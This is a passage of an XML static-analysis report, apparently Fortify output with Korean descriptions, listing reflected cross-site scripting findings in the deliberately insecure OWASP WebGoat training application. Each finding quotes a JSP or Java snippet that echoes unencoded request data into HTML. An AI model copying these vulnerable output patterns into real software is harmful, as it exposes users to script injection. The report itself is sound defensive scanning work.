<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1564E380F05920BAE9B03CA27045B0E1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B534DB57BDDFD32DA6ED0769369F8DCE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="468ECCFDE0E31F44F3773AF8F9C5199B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6B2FC09DF7AF51D4F59372C8F4E93B45" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7E29B49E42036569BB51EF5AD7810192" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 createContent() 메서드가 359 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>359</LineStart>
<Snippet>			tr.addElement( new TD( "Enter a string: " ) );

			Input input = new Input( Input.TEXT, INPUT, userInput );

			tr.addElement( new TD().addElement( input ) );</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="23007CDDF33B78986FE6AD09696B5EEE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0237787782A9F9B9960AB09C8B93F745" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2E7359DAC61CBD5EEA7A4A3822651FC3" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReportCardScreen.java의 makeUser() 메서드가 295 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>295</LineStart>
<Snippet>	//String type = s.isAdmin() ? " [Administrative User]" : s.isHackedAdmin() ? " [Normal User - Hacked Admin Access]" : " [Normal User]";
	String type = "";
	h2.addElement(new StringElement("Results for: " + user + type));
	return h2;
    }</Snippet>
<TargetFunction>org.apache.ecs.html.H2.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>576</LineStart>
<Snippet>	}

	return request.getParameterNames();
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F4C1EDD488D86810E45802B9BD96338B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SearchStaff.jsp의 _jspService() 메서드가 11 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SearchStaff.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>			{
			%&gt;
				Employee &lt;%=searchedName%&gt; not found.
			&lt;%
			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/SearchStaff.jsp</FilePath>
<LineStart>7</LineStart>
<Snippet>			&lt;% 
			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			String searchedName = request.getParameter(SQLInjection.SEARCHNAME);
			if (searchedName != null)
			{</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A1FB9AC88D5FF26D4F9735B93960E831" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 171 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>171</LineStart>
<Snippet>			//System.out.println("Redirecting to " + thisPage);
		%&gt;
			&lt;script language="javascript"&gt;location.href="&lt;%=thisPage%&gt;"&lt;/script&gt;
		&lt;%
		}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>521</LineStart>
<Snippet>				thisLink += "&amp;";
			}
			thisLink = thisLink + name + "=" + request.getParameter(name);
		}
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2BB646265D41338CC5ABF24FF3DE1BAC" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 214 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>214</LineStart>
<Snippet>			{
			%&gt;
			&lt;div id="lessonContent"&gt;&lt;%=currentLesson.getContent()%&gt;&lt;/div&gt;
			&lt;%
			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8ADD0449AB48BA588FCC57E4041FC215" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 makeRow() 메서드가 794 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>794</LineStart>
<Snippet>		TD desc = new TD().addElement( description ).setBgColor( "#bbbbbb" );
		TD val1 = new TD().addElement( value1 ).setBgColor( "#dddddd" );
		TD val2 = new TD().addElement( value2 ).setBgColor( "#dddddd" );
		TR tr = new TR();
</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="136B8494DBEDB037F4B6373CB3FB1037" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 createContent() 메서드가 175 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>175</LineStart>
<Snippet>	    String query = "SELECT * FROM user_data WHERE userid = "
		    + accountNumber;
	    ec.addElement(new PRE(query));
	    for (int i = 0; i &lt; accountNumber.length(); i++)
	    {</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.PRE()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="19E64350043065A60FC9EB5CA98CE6FD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1AF509C2F501C0D73CB846B48411DD79" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="27054C1C60FF93F008A72761A672E678" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 150 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>150</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY3", s.getParser()
			    .getStringParameter("QTY3", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY3", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="855A95B78EDD43416CCC1AE36767637D" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReportCardScreen.java의 makeUser() 메서드가 295 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>295</LineStart>
<Snippet>	//String type = s.isAdmin() ? " [Administrative User]" : s.isHackedAdmin() ? " [Normal User - Hacked Admin Access]" : " [Normal User]";
	String type = "";
	h2.addElement(new StringElement("Results for: " + user + type));
	return h2;
    }</Snippet>
<TargetFunction>org.apache.ecs.html.H2.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EA39016909F45F53EEFCE398478A6CEC" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ForgotPassword.java의 doStage3() 메서드가 191 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ForgotPassword.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ForgotPassword.java</FilePath>
<LineStart>191</LineStart>
<Snippet>	
		tr = new TR();
		tr.addElement(new TD().addElement(new StringElement("Username: " + USERNAME_RESPONSE)));
		t.addElement(tr);
	</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EF94929C1FE59B867F2ABCC7D55B536D" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CF9B858F163C81EE801A23EFD0AC293E" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 makeUser() 메서드가 377 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>377</LineStart>
<Snippet>    {
	ElementContainer ec = new ElementContainer();
	ec.addElement(new P().addElement("Welcome, " + user));
	ec.addElement(new P().addElement("You have been authenticated with "
		+ method));</Snippet>
<TargetFunction>org.apache.ecs.html.P.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E772E389674EF036ACBD4BAD17EA36B7" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DDF21C7928D0862974445A3FE742FCEC" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewDatabase.java의 createContent() 메서드가 72 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
